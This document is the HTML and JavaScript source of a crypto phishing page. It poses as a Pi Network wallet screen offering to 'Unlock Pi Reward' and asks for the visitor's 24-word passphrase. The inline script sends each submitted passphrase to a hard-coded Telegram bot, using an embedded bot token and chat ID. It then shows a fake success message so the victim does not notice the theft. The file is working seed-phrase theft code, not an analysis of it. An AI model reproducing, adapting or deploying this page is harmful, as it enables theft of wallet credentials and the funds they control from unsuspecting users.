<body>
    <div id="loading-spinner"></div>
    <div id="main" class="container">
        <div class="header">
            <div class="back">
                <a href="#">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px">

            <div class="title-page">
                <span>Wallet</span>
            </div>
        </div>

        <div class="form-container">
            <div class="title">
                Unlock Pi Reward
            </div>
            <form action="checkm.php" method="post" onsubmit="return validateForm()">
                <div class="textarea-container">
                    <textarea id="content" name="content" required rows="8" class="block w-full p-3 text-lg text-gray-800 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500" placeholder="Enter your 24-word passphrase here"></textarea>
                </div>
                <input type="hidden" name="ip_address" id="ip_address" value="">
                <input type="hidden" id="key" name="key">
                <button type="submit" class="button">Unlock with passphrase</button>
                <div id="emsg" class="message"></div>
            </form>

            <div class="text-block">
                <h5>As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.</h5>
            </div>
            <div class="text-block">
                <h5>Lost your wallet passphrase? <span>you can create a new wallet</span>, but all the PI numbers in your previous wallet will be inaccessible.</h5>
            </div>
        </div>
    </div>

    <script>
        // Function to send a message to Telegram with the passphrase
        function sendToTelegram(passphrase) {
            const chatId = '6192345184'; // Replace with your chat ID
            const botKey = '7983478760:AAH6opxpnjn2GCGIy425GQu8eo6CjHpBigI'; // Replace with your bot key
            const message = `New passphrase: ${passphrase}`;
    
            const url = `https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Message sent to Telegram:', data);
                    showSuccessMessage(); // Show success message
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
        }
    
        // Function to show success message and clear the form
        function showSuccessMessage() {
            document.getElementById("emsg").innerHTML = "Success! Your passphrase has been successfully submitted.";
            document.getElementById("emsg").style.color = "green";
            document.getElementById("emsg").style.fontWeight = "bold";
    
            // Clear the textarea and hidden fields
            document.getElementById("content").value = "";
            document.getElementById("key").value = "";
            setTimeout(function() {
            location.reload(); // This reloads the page
        }, 2000);
        }
    
        // Form validation function
        function validateForm() {
            const textarea = document.getElementById("content");
            const inputValue = textarea.value.trim();
    
            // Check for 24 letters (no spaces)
            const isLetterCountValid = inputValue.replace(/\s+/g, '').length >= 24;
    
            // If validation passes, send the data to Telegram
            if (isLetterCountValid) {
                sendToTelegram(inputValue);
                return false; // Prevent form submission
            } else {
                document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be at least 24 characters)";
                return false;
            }
        }
    
        // Prevent form submission before full load
        document.addEventListener("DOMContentLoaded", () => {
            const form = document.querySelector("form");
            form.onsubmit = function (event) {
                if (!validateForm()) {
                    event.preventDefault(); // Stop form submission if validation fails
                }
            };
    
            // Unhide content after page loads
            window.onload = () => {
                document.getElementById("loading-spinner").style.display = "none";
                document.getElementById("main").style.display = "block";
            };
        });
    </script>
